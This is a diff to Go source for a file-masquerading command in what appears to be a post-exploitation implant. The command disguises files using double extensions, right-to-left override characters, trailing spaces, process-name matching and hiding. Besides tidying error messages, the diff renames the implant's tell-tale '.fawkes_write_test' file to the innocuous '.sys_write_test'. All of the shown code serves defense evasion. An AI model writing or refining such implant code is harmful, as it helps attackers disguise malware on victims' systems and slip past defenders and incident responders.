@@ -35,7 +35,7 @@ func (c *MasqueradeCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Source == "" {
-		return errorResult("Error: source file path is required")
+		return errorResult("source file path is required")
 	}
 
 	// Handle hide/unhide techniques
@@ -47,27 +47,27 @@ func (c *MasqueradeCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if args.Technique == "" {
-		return errorResult("Error: technique is required (double_ext, rtlo, space, process, match_ext, hide, unhide)")
+		return errorResult("technique is required (double_ext, rtlo, space, process, match_ext, hide, unhide)")
 	}
 
 	// Verify source exists
 	srcInfo, err := os.Stat(args.Source)
 	if err != nil {
-		return errorf("Error: source file not found: %v", err)
+		return errorf("source file not found: %v", err)
 	}
 	if srcInfo.IsDir() {
-		return errorResult("Error: source must be a file, not a directory")
+		return errorResult("source must be a file, not a directory")
 	}
 
 	// Generate the masqueraded filename
 	destName, err := generateMasqueradeName(args.Source, args.Technique, args.Disguise)
 	if err != nil {
-		return errorf("Error generating masquerade name: %v", err)
+		return errorf("generating masquerade name: %v", err)
 	}
 
 	// Place in source directory if writable, otherwise use temp directory
 	destDir := filepath.Dir(args.Source)
-	testFile := filepath.Join(destDir, ".fawkes_write_test")
+	testFile := filepath.Join(destDir, ".sys_write_test")
 	if f, err := os.Create(testFile); err != nil {
 		// Source directory not writable — use temp directory
 		destDir = os.TempDir()
@@ -80,14 +80,14 @@ func (c *MasqueradeCommand) Execute(task structs.Task) structs.CommandResult {
 	if args.InPlace {
 		// Rename in place
 		if err := os.Rename(args.Source, destPath); err != nil {
-			return errorf("Error renaming file: %v", err)
+			return errorf("renaming file: %v", err)
 		}
 		return successf("[+] Masqueraded (renamed in-place)\n  Source:  %s\n  Result:  %s\n  Technique: %s", args.Source, destPath, args.Technique)
 	}
 
 	// Copy with new name
 	if err := masqueradeCopyFile(args.Source, destPath); err != nil {
-		return errorf("Error copying file: %v", err)
+		return errorf("copying file: %v", err)
 	}
 
 	return successf("[+] Masqueraded (copied)\n  Source:  %s\n  Result:  %s\n  Technique: %s", args.Source, destPath, args.Technique)
